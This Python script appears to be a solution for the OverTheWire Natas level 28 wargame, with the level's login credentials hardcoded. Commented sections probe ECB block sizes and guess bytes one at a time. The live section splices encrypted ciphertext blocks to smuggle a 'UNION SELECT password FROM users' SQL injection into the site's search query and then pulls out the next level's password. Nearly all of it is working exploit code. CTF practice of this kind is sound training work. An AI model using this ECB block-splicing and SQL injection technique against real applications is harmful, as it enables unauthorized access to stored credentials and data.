import requests
import re,base64

username ='natas28'
password ='JWwR438wkgTsNKBbcJoowyysdM82YjeF'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()

block_size=16
##############################################################SET 1 #############################################
# for i in range(16):
    
#     data={"query":"a"*i}
#     responce = requests.post(url,auth=(username,password),data=data)
#     print("Query_length:"+str(i)+"responce_length:",len(base64.b64decode(requests.utils.unquote(responce.url[60:]))))

#     print("="*50)
#     for block in range(int(80/block_size)):
#         d = base64.b64decode(requests.utils.unquote(responce.url[60:]))[int(block)*block_size:(int(block)+1)*block_size]
#         print("block = "+str(block)+"data = "+str(d))



###################################SET 2 ##########################################################################
# import string
# correct_string = "b'\\x9eb&\\x86\\xa5&@YW\\x06\\t\\x9a\\xbc\\xb0R\\xbb'"
# for c in string.printable:
#     print("trying = ",c)
#     data={"query":"a"*9 + c}
#     print(data)
#     responce = requests.post(url,auth=(username,password),data=data)
#     block =2
#     answer = base64.b64decode(requests.utils.unquote(responce.url[60:]))[int(block)*block_size:(int(block)+1)*block_size]
#     # print(correct_string)
#     # print(answer)
#     # print(str(answer)==str(correct_string))
#     if str(answer) == str(correct_string):
#         print("WE FOUND STRING = "+c)
#         break


######################################SET 3 #######################################################################
inject = 'a'*9 +"'UNION SELECT password FROM users; #"
# print(type(inject.encode('UTF-8')))
# print(inject)
blocks = (len(inject)-10)/block_size
if ((len(inject))-10) % block_size!=0:
    blocks+=1
# print (int(blocks))

data={"query":inject}
responce = requests.post(url,auth=(username,password),data=data)
raw_inject = base64.b64decode(requests.utils.unquote(responce.url[60:]))
# print(type(raw_inject))
# print(raw_inject)

data={"query":"a"*10}
responce = requests.post(url,auth=(username,password),data=data)
good_base = base64.b64decode(requests.utils.unquote(responce.url[60:]))
# print(type(good_base))
# print(good_base)


queary = good_base[:int(block_size*3)] + raw_inject[int(block_size*3):int(block_size*3+(int(blocks)*block_size))] + good_base[int(block_size*3):]
# print (type((raw_inject[int(block_size*3):int(block_size*3+(blocks*block_size))])))
# print(type(good_base[int(block_size*3):]))
# print(queary)



b64encoded = (base64.b64encode(queary))

final_queary = (requests.utils.quote(b64encoded).replace('/','%2f'))
# print(final_queary)

responce = requests.get(url +"/search.php/?query=" + final_queary , auth=(username,password))
print("password for natas 29 is = "+re.findall("<li>(.*)</li></ul>",responce.text)[0])

